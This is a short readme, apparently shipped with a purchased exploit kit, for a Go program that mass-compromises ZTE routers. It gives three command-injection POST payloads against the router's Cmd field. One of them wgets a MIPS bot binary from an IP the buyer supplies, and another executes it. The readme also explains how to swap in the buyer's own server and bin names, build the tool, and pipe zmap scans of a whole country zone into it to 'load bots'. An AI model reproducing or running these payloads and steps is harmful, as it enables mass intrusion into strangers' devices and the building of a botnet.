Requirements: Zmap and Golang. You can set this up yourself.

Requirements: nano /usr/include/bits/typesizes.h you have to set this to 999999.

In the ZTE.GO file you will see a specific couple of lines that look like this:

var payload []byte = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cp+%2Fetc%2Finit.norm+%2Fvar%2Ftmp%2Finit.norm&CmdAck=")
var payload2 []byte = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http%3A%2F%2F111.11.111.111%2Fgaybub%2Fmips+-O+%2Fvar%2Ftmp%2Finit.norm&CmdAck=")
var payload3 []byte = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=%2Fvar%2Ftmp%2Finit.norm+ztev2&CmdAck=")

The only thing we need to change is: 1&Cmd=wget+http%3A%2F%2F142.93.157.119%2Fgaybub%2Fmips

Where is says (111.11.111.111) Replace that with your Net IP. Where it says (gaybubs) change that to your net bins, every bin should be named the same name. Where it says (Fmips) put your mips bin name in that. Example: (Fgay.mips)

Install: go build -o zte zte.go

Now finally to run the exploit this is the command: zmap -p 443 -w jo.zone -B1M|./zte (You may replace with whatever zone you want).

If you are going to use an external zone make sure it is a .zone file.

If ZTE is not loading any bots like lets say 4 bots in 15 minutes that means you have to set your ulimits, etc. And then reload your net and it should load a decent amount of bots.

Thanks for purchasing!!
